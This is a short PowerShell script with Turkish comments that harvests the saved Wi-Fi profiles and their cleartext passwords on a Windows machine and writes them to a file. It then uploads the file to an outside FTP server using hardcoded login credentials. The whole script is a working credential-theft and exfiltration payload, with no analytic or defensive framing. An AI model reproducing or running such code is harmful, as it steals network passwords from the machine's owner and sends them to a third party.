# Wi-Fi profillerini dosyaya yaz
$localFile = "$env:USERPROFILE\wifipass.txt"
netsh wlan show profile name="*" key=clear > $localFile

# FTP bilgileri
$ftpUrl = "ftp://ftpupload.net/wifipass.txt"
$ftpUser = "if0_39536575"
$ftpPass = "tThCkj4zwg"

# FTP bağlantısı için WebClient oluştur
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

try {
    # Dosyayı FTP'ye yükle
    $webclient.UploadFile($ftpUrl, "STOR", $localFile)
    Write-Host "Dosya başarıyla FTP'ye yüklendi."
}
catch {
    Write-Host "Hata oluştu: $_"
}
